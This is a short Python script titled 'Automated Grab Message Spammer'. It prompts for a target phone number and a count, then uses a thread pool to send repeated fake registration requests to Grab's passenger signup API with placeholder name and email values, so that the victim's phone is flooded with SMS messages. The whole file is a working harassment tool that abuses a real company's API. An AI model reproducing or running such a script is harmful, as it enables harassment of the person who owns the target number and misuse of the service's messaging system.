#!/usr/bin/python
# -*- coding: utf-8 -*-
# Coded by Hacurity
from multiprocessing.pool import ThreadPool
try:
	import os, random
	from time import sleep as slp
	import subprocess as sp
	import requests
except ModuleNotFoundError:
	print("\nRequests module is missing!")
	print("$ pip install requests\n")
	exit()

try:
	os.system('clear')
	print("""\033[1;36mAutomated Grab Message Spammer\033[1;32m
      \033[1;31mAuthor : Hacurity\033[1;32m
""")

	no = input("\033[1;37m[?] PhoneNumber (including CountryCode) =>\033[1;36m ")
	count=int(input("\033[1;37m[?] Tedad => \033[1;36m"))
except KeyboardInterrupt:
	print("\nUser KeyboardInterrupt")
	exit()
print()
print("[*] RESULT:")
def main(arg):
	try:
		pnum=('phoneNumber')
		r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':no, 'countryCode': 'ID', 'name': 'nuubi', 'email': 'nuubi@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
#		print(r.text)
		if str(pnum) in str(r.text):
			print("\033[1;32m[+] Successfull")
		else:
			print("\033[1;31m[-] Failed")
	except: pass

jobs = []
for x in range(count):
    jobs.append(x)
p=ThreadPool(5)
p.map(main,jobs)
print("done ^•^")
